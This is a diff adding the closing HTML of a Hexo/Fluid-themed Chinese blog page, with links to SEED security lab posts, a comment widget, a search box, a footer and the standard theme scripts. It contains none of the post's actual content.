+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/p/c51248f4/" title="SEED-lab：Environment Variable and Set-UID Program Lab">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SEED-lab：Environment Variable and Set-UID Program Lab</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/p/529b2f3d/" title="SEED-lab：Race Condition Vulnerability Lab">
+                        <span class="hidden-mobile">SEED-lab：Race Condition Vulnerability Lab</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'LaPhilosophie/gls.show');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> <script src="/js/cursor.js"></script>
+</div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP备2021035969号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        MathJax = {
+          tex    : {
+            inlineMath: { '[+]': [['$', '$']] }
+          },
+          loader : {
+            load: ['ui/lazy']
+          },
+          options: {
+            renderActions: {
+              findScript    : [10, doc => {
+                document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                  const display = !!node.type.match(/; *mode=display/);
+                  const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                  const text = document.createTextNode('');
+                  node.parentNode.replaceChild(text, node);
+                  math.start = { node: text, delim: '', n: 0 };
+                  math.end = { node: text, delim: '', n: 0 };
+                  doc.math.push(math);
+                });
+              }, '', false],
+              insertedScript: [200, () => {
+                document.querySelectorAll('mjx-container').forEach(node => {
+                  let target = node.parentNode;
+                  if (target.nodeName.toLowerCase() === 'li') {
+                    target.parentNode.classList.add('has-jax');
+                  }
+                });
+              }, '', false]
+            }
+          }
+        };
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.0/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
